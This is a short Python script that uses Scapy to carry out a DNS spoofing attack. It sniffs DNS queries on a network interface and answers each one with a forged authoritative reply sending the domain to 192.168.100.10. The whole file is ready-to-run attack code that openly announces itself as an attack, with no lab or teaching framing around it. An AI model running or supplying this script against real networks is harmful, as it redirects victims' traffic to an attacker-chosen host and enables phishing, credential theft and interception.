from scapy.all import *
import sys

def dns_spoof(pkt):
    # Process all DNS queries
    if (DNS in pkt and 
        IP in pkt and
        pkt[DNS].opcode == 0 and 
        pkt[DNS].ancount == 0):
        
        domain = pkt[DNS].qd.qname.decode()
        print(f"Received DNS query for: {domain} from {pkt[IP].src}")
        
        # Send spoofed response
        ip = IP(
            src=pkt[IP].dst,
            dst=pkt[IP].src
        )
        udp = UDP(
            sport=pkt[UDP].dport,
            dport=pkt[UDP].sport
        )
        dns = DNS(
            id=pkt[DNS].id,
            qr=1,          # Response
            aa=1,          # Authoritative Answer
            rd=1,          # Recursion Desired
            ra=1,          # Recursion Available
            qd=pkt[DNS].qd,
            an=DNSRR(
                rrname=domain,
                type='A',
                ttl=1,
                rdata='192.168.100.10'
            )
        )
        
        spoofed_pkt = ip/udp/dns
        send(spoofed_pkt, verbose=0)
        print(f"Spoofed DNS response sent: {domain} -> 192.168.100.10")

print("Starting DNS Spoofing Attack...")
print("Waiting for DNS queries...")
sniff(filter="udp port 53", prn=dns_spoof, iface="eth0")
